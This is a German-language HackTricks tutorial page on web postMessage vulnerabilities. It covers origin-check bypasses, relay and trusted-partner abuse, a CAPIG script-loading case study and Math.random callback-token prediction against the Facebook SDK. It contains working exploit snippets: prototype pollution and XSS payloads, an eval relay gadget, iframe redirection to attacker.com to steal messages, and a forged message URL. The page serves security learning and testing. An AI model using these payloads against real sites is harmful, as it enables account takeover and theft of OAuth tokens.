# PostMessage-Schwachstellen

{{#include ../../banners/hacktricks-training.md}}

## PostMessage senden

**PostMessage** verwendet die folgende Funktion, um eine Nachricht zu senden:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachte, dass **targetOrigin** ein '\*' oder eine URL wie _https://company.com._ sein kann.\
Im **zweiten Szenario** kann die **Nachricht nur an diese Domain gesendet werden** (auch wenn die origin des window object unterschiedlich ist).\
Wenn das **wildcard** verwendet wird, **können Nachrichten an jede Domain gesendet werden**, und sie werden an die origin des Window objects gesendet.

### Angriff auf iframe & wildcard in **targetOrigin**

Wie in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erläutert: Wenn du eine Seite findest, die **iframed** werden kann (kein `X-Frame-Header`-Schutz) und die **sensitive** Nachrichten via **postMessage** mit einem **wildcard** (\*) versendet, kannst du die **origin** des **iframe** ändern, wodurch ein **leak** der **sensitive** Nachricht an eine von dir kontrollierte Domain möglich ist.\
Beachte, dass, wenn die Seite iframed werden kann, aber **targetOrigin** **auf eine URL und nicht auf ein wildcard gesetzt** ist, dieser **Trick nicht funktioniert**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages` erwartet**.\
Ein Code ähnlich dem folgenden wird verwendet:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Beachte in diesem Fall, wie das **erste**, was der Code macht, die **origin zu überprüfen**. Das ist äußerst **wichtig**, vor allem wenn die Seite etwas **Sensibles** mit den empfangenen Informationen tun wird (z. B. ein Passwort ändern). **Wenn sie die origin nicht überprüft, können Angreifer Opfer dazu bringen, beliebige Daten an diesen Endpunkt zu senden** und die Passwörter der Opfer (in diesem Beispiel) zu ändern.

### Enumeration

Um **event listeners** auf der aktuellen Seite zu finden, kannst du:

- **Nach** dem JS-Code suchen nach `window.addEventListener` und `$(window).on` (_JQuery version_)
- **Im Console der Developer Tools ausführen:** `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gehe zu** _Elements --> Event Listeners_ in den Developer Tools des Browsers

![](<../../images/image (396).png>)

- Verwende eine **browser extension** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese Browser-Erweiterungen werden **alle Nachrichten abfangen** und sie dir anzeigen.

### Umgehungen der Origin-Prüfung

- Das Attribut **`event.isTrusted`** gilt als sicher, da es nur `True` für Events zurückgibt, die durch echte Benutzeraktionen erzeugt wurden. Obwohl es schwer zu umgehen ist, wenn korrekt implementiert, ist seine Bedeutung für Sicherheitsprüfungen bemerkenswert.
- Die Verwendung von **`indexOf()`** zur Origin-Validierung bei PostMessage-Events kann umgehbar sein. Ein Beispiel, das diese Schwachstelle verdeutlicht, ist:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`**-Methode von `String.prototype.search()` ist für reguläre Ausdrücke gedacht, nicht für Strings. Wird etwas anderes als ein Regexp übergeben, erfolgt eine implizite Konvertierung zu einem Regex, was die Methode potenziell unsicher macht. In Regex fungiert ein Punkt (.) als Wildcard, wodurch eine Validierung mit speziell konstruierten Domains umgangen werden kann. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`**-Funktion verarbeitet ähnlich wie `search()` Regex. Wenn das Regex schlecht aufgebaut ist, kann es umgehbar sein.
- Die **`escapeHtml`**-Funktion soll Eingaben durch Escaping von Zeichen sanitisieren. Sie erzeugt jedoch kein neues escaped-Objekt, sondern überschreibt die Properties des bestehenden Objekts. Dieses Verhalten lässt sich ausnutzen. Insbesondere wenn ein Objekt so manipuliert werden kann, dass seine kontrollierte Property `hasOwnProperty` nicht erkennt, führt `escapeHtml` nicht die erwartete Sanitization durch. Das wird in den folgenden Beispielen demonstriert:

- Erwartetes Scheitern:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Umgehung des Escapings:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Im Kontext dieser Schwachstelle ist das `File`-Objekt besonders ausnutzbar, da seine Property `name` read-only ist. Diese Property wird, wenn sie in Templates verwendet wird, von `escapeHtml` nicht gesäubert, was zu potenziellen Sicherheitsrisiken führt.

- Die Eigenschaft `document.domain` in JavaScript kann von einem Script gesetzt werden, um die Domain zu verkürzen, wodurch innerhalb derselben Parent-Domain eine lockerere Same-Origin-Policy-Erzwingung möglich wird.

### Origin-only trust + trusted relays

Wenn ein Receiver nur **`event.origin`** prüft (z. B. vertraut `*.trusted.com`), kannst du oft eine **"Relay"-Seite auf dieser Origin finden, die angreifer-kontrollierte Parameter per `postMessage`** an ein angegebenes `targetOrigin`/`targetWindow` zurückspiegelt. Beispiele sind Marketing-/Analytics-Gadgets, die Query-Parameter nehmen und `{msg_type, access_token, ...}` an `opener`/`parent` weiterleiten. Du kannst:

- **Die Opferseite in einem Popup/iframe öffnen, das ein `opener` hat**, sodass dessen Handler registriert werden (viele pixels/SDKs hängen Listener nur an, wenn `window.opener` existiert).
- **Ein anderes Angreifer-Fenster zur Relay-Endpoint auf der trusted origin navigieren**, und damit die Message-Felder befüllen, die du injizieren willst (message type, tokens, nonces).
- Da die Nachricht nun **von der trusted origin** kommt, besteht die Origin-Prüfung und du kannst privilegierte Aktionen (Zustandsänderungen, API-Aufrufe, DOM-Schreibvorgänge) im Listener des Opfers auslösen.

Abuse-Pattern, die in der Praxis beobachtet wurden:

- Analytics-SDKs (z. B. pixel/fbevents-ähnlich) konsumieren Nachrichten wie `FACEBOOK_IWL_BOOTSTRAP`, rufen dann **Backend-APIs mit einem im Message gelieferten Token** auf und schließen **`location.href` / `document.referrer`** im Request-Body ein. Wenn du dein eigenes Token lieferst, kannst du **diese Requests in der Request-History/den Logs des Tokens einsehen** und OAuth-Codes/tokens, die in der URL/referrer der Opferseite vorhanden sind, exfiltrieren.
- Jede Relay-Seite, die beliebige Felder in `postMessage` reflektiert, erlaubt es dir, **erwartete message types zu spoofen**. Kombiniert mit schwacher Input-Validierung lassen sich damit Graph/REST-Calls, Feature-Freischaltungen oder CSRF-ähnliche Flows erreichen.

Hunting-Tipps: Enumeriere `postMessage`-Listener, die nur `event.origin` prüfen, und suche dann nach **gleichoriginigen HTML/JS-Endpunkten, die URL-Parameter via `postMessage` weiterleiten** (Marketing-Previews, Login-Popups, OAuth-Error-Pages). Verknüpfe beides mit `window.open()` + `postMessage`, um Origin-Prüfungen zu umgehen.

### e.origin == window.origin bypass

Beim Einbetten einer Webseite in ein **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass die Origin des iframe auf `null` gesetzt wird. Das ist besonders relevant im Umgang mit Sandbox-Attributen und deren Auswirkungen auf Sicherheit und Funktionalität.

Wenn im sandbox-Attribut **`allow-popups`** angegeben ist, erben Popups, die aus dem iframe geöffnet werden, die Sandbox-Beschränkungen des Elternteils. Das bedeutet, dass sofern nicht auch das Attribut **`allow-popups-to-escape-sandbox`** gesetzt ist, die Origin des Popups ebenfalls auf `null` gesetzt wird, also mit der Origin des iframe übereinstimmt.

Folglich, wenn ein Popup unter diesen Bedingungen geöffnet wird und eine Nachricht vom iframe an das Popup mittels **`postMessage`** gesendet wird, haben beide Seiten `null` als Origin. Das führt zu der Situation, dass **`e.origin == window.origin`** wahr ergibt (`null == null`), weil sowohl iframe als auch Popup denselben Origin-Wert `null` teilen.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Es ist möglich zu prüfen, ob die Nachricht aus demselben Fenster stammt, in dem das Script lauscht (besonders interessant für **Content Scripts von Browser-Erweiterungen**, um zu prüfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Du kannst das **`e.source`** einer Nachricht auf null setzen, indem du ein **iframe** erstellst, das die **postMessage** **sendet** und **sofort gelöscht** wird.

Für weitere Informationen **lies:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Um diese Angriffe durchzuführen solltest du idealerweise die **Opfer-Webseite** in ein `iframe` einbetten können. Aber manche Header wie `X-Frame-Header` können dieses **Verhalten** **verhindern**.\
In solchen Szenarien kannst du trotzdem einen weniger unauffälligen Angriff verwenden. Du kannst einen neuen Tab zur verwundbaren Webanwendung öffnen und mit ihr kommunizieren:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Nachricht, die an ein Child gesendet wird, stehlen, indem die Main-Seite blockiert wird

Auf der folgenden Seite siehst du, wie du eine **sensitive postmessage data**, die an ein **child iframe** gesendet wird, stehlen könntest, indem du die **main** Seite vor dem Senden der Daten **blockierst** und eine **XSS in the child** ausnutzt, um die Daten zu **leak** bevor sie empfangen werden:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Nachricht stehlen durch Ändern der iframe location

Wenn du eine Webseite ohne X-Frame-Header iframen kannst, die ein weiteres iframe enthält, kannst du die **location of that child iframe** ändern, sodass, falls es eine **postmessage** empfängt, die mit einem **wildcard** gesendet wurde, ein Angreifer den **origin** dieses iframe auf eine von ihm **controlled** Seite ändern und die Nachricht **steal** könnte:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die über `postMessage` gesendeten Daten von JS ausgeführt werden, kannst du die **page** iframen und die **prototype pollution/XSS** ausnutzen, indem du das Exploit via `postMessage` sendest.

Ein sehr gut erklärtes Beispiel für XSS durch `postMessage` findet sich unter [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Beispiel für ein Exploit, um **Prototype Pollution and then XSS** durch eine `postMessage` an ein `iframe` auszunutzen:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Für **weitere Informationen**:

- Link zur Seite über [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link zur Seite über [**XSS**](../xss-cross-site-scripting/index.html)
- Link zur Seite über [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Vom Origin abgeleitetes Script-Laden & Supply-Chain-Pivot (CAPIG-Fallstudie)

`capig-events.js` registrierte einen `message`-Handler nur, wenn `window.opener` existierte. Bei `IWL_BOOTSTRAP` überprüfte es `pixel_id`, speicherte jedoch `event.origin` und verwendete es später, um `${host}/sdk/${pixel_id}/iwl.js` zu erstellen.

<details>
<summary>Handler schreibt vom Angreifer kontrollierten Origin</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Get an opener: z. B. in Facebook Android WebView `window.name` mit `window.open(target, name)` wiederverwenden, sodass das Fenster sein eigener opener wird, und dann eine Nachricht aus einem bösartigen iframe posten.
2. Sende `IWL_BOOTSTRAP` von beliebigem origin, um `host = event.origin` in `localStorage` zu persistieren.
3. Hoste `/sdk/<pixel_id>/iwl.js` auf jedem von CSP erlaubten origin (takeover/XSS/upload auf einer whitelisti­ng analytics-Domain). `startIWL()` lädt dann attacker JS in die einbettende Seite (z. B. `www.meta.com`) und ermöglicht credentialed cross-origin Aufrufe sowie Account Takeover.

Wenn direkte Kontrolle über den opener unmöglich war, erlaubte das Kompromittieren eines Third-party iframe auf der Seite trotzdem, das konstruierte `postMessage` an das Parent zu senden, um den gespeicherten host zu vergiften und das Script-Laden zu erzwingen.

**Backend-generated shared script → stored XSS:** das Plugin `AHPixelIWLParametersPlugin` hat User-Rule-Parameter an JS angehängt, das an `capig-events.js` angehängt wurde (z. B. `cbq.config.set(...)`). Das Injizieren von Breakouts wie `"]}` fügte beliebiges JS ein und erzeugte stored XSS im shared script, das an alle Sites ausgeliefert wurde, die es laden.

### Trusted-origin allowlist isn't a boundary

Eine strikte `event.origin`-Prüfung funktioniert nur, wenn die **trusted origin kein attacker JS ausführen kann**. Wenn privilegierte Seiten Third-party iframes einbetten und annehmen, dass `event.origin === "https://partner.com"` sicher ist, wird jede XSS in `partner.com` zur Brücke in das Parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
In freier Wildbahn beobachtetes Angriffsmuster:

1. **Exploit XSS im Partner-iframe** und legen ein relay gadget ab, sodass jede `postMessage` zu code exec innerhalb der vertrauenswürdigen Origin wird:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Von der Angreiferseite**, sende JS an das kompromittierte iframe, das einen erlaubten Nachrichtentyp zurück an das parent weiterleitet. Die Nachricht stammt von `partner.com`, passiert die allowlist und enthält HTML, das unsicher eingefügt wird:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Das Parent injiziert den Angreifer-HTML-Code und ermöglicht dadurch **JS execution in the parent origin** (z. B. `facebook.com`), was dann zum Diebstahl von OAuth-Codes oder zum Pivot auf vollständige Account-Übernahmen genutzt werden kann.

Key takeaways:

- **Partner origin isn't a boundary**: jede XSS in einem "vertrauenswürdigen" Partner erlaubt Angreifern, erlaubte Nachrichten zu senden, die `event.origin`-Checks umgehen.
- Handler, die **partner-controlled payloads** rendern (z. B. `innerHTML` bei bestimmten Nachrichtentypen), verwandeln eine Kompromittierung des Partners in ein same-origin DOM XSS.
- Eine breite **message surface** (viele Typen, keine Strukturvalidierung) bietet mehr Gadgets zum Pivotieren, sobald ein Partner-iframe kompromittiert ist.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Wenn die Nachrichtenvalidierung ein mit `Math.random()` erzeugtes “shared secret” verwendet (z. B. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) und derselbe Helper auch Plugin-iframes benennt, kann man PRNG-Ausgaben rekonstruieren und vertrauenswürdige Nachrichten fälschen:

- **Leak PRNG outputs via `window.name`:** Das SDK benennt Plugin-iframes automatisch mit `guid()`. Wenn du den top frame kontrollierst, iframe die Victim-Seite, navigiere dann das Plugin-iframe zu deiner Origin (z. B. `window.frames[0].frames[0].location='https://attacker.com'`) und lese `window.frames[0].frames[0].name`, um eine rohe `Math.random()`-Ausgabe zu erhalten.
- **Force more outputs without reloads:** Einige SDKs bieten einen Reinit-Pfad; im FB SDK erzwingt das Auslösen von `init:post` mit `{xfbml:1}` `XFBML.parse()`, zerstört/erstellt das Plugin-iframe neu und generiert neue Namen/Callback-IDs. Wiederholtes Reinit erzeugt so viele PRNG-Ausgaben wie nötig (achte auf zusätzliche interne `Math.random()`-Aufrufe für Callback-/iframe-IDs, daher müssen Solver dazwischenliegende Werte überspringen).
- **Trusted-origin delivery via parameter pollution:** Wenn ein First-party Plugin-Endpunkt einen ungesäuberten Parameter in die cross-window payload reflektiert (z. B. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), kannst du `&type=...&iconSVG=...` injizieren und gleichzeitig den vertrauenswürdigen `facebook.com`-Origin beibehalten.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` und speise mehrere Werte (auch nicht-konsekutive) in einen V8 `Math.random` Predictor (z. B. Z3-basiert). Erzeuge lokal das nächste `guid()`, um das erwartete Callback-Token zu fälschen.
- **Trigger the sink:** Baue die postMessage-Daten so, dass die Bridge `xd.mpn.setupIconIframe` dispatcht und HTML in `iconSVG` injiziert (z. B. URL-enkodiertes `<img src=x onerror=...>`), wodurch ein DOM XSS innerhalb der Hosting-Origin erreicht wird; von dort aus können same-origin iframes (OAuth-Dialoge, arbiters, etc.) ausgelesen werden.
- **Framing quirks help:** Die Kette erfordert Framing. In manchen mobilen Webviews kann `X-Frame-Options` zu dem nicht unterstützten `ALLOW-FROM` degradieren, wenn `frame-ancestors` vorhanden ist, und „compat“-Parameter können permissive `frame-ancestors` erzwingen, wodurch der `window.name` side channel ermöglicht wird.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referenzen

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Zum Üben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
